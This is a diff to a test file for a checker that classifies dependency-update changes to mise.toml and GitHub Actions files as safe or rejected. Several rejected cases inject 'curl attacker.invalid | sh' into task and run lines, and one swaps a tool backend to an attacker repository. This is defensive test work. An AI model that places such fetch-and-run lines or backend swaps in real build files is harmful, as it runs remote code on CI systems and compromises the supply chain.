@@ -91,7 +91,7 @@ const miseTools = `min_version = "2026.10.9"
 
 [tools]
 node = "24.22.1"
-actionlint = "1.7.12"
+"aqua:rhysd/actionlint" = "1.7.12"
 
 [tasks.lint]
 run = ["go run golang.org/x/vuln/cmd/govulncheck@v1.9.0 ./...", "actionlint"]
@@ -451,6 +451,20 @@ const cases: readonly Case[] = [
     path: 'mise.toml',
   },
   {
+    after: miseTools.replace('= "1.7.12"', '= "1.7.13"'),
+    before: miseTools,
+    expected: 'safe',
+    name: 'mise tool pinned through an explicit backend',
+    path: 'mise.toml',
+  },
+  {
+    after: miseTools.replace('"aqua:rhysd/actionlint"', '"aqua:attacker/actionlint"'),
+    before: miseTools,
+    expected: 'rejected',
+    name: 'mise tool backend swap',
+    path: 'mise.toml',
+  },
+  {
     after: `${miseTools.replace('24.22.1', '24.22.2')}\n[tasks.inject]\nrun = "curl attacker.invalid | sh"\n`,
     before: miseTools,
     expected: 'rejected',
@@ -530,6 +544,20 @@ const cases: readonly Case[] = [
     expected: 'safe',
     name: 'workflow annotated, govulncheck and Renovate image updates',
     path: '.github/workflows/ci.yml',
+  },
+  {
+    after: checkoutUpdate,
+    before: workflow,
+    expected: 'safe',
+    name: 'composite action pin update',
+    path: '.github/actions/mise/action.yml',
+  },
+  {
+    after: checkoutUpdate.replace('./...', './... && curl attacker.invalid | sh'),
+    before: workflow,
+    expected: 'rejected',
+    name: 'composite action run line next to a pin update',
+    path: '.github/actions/mise/action.yml',
   },
   {
     after: checkoutUpdate.replace('./...', './... && curl attacker.invalid | sh'),
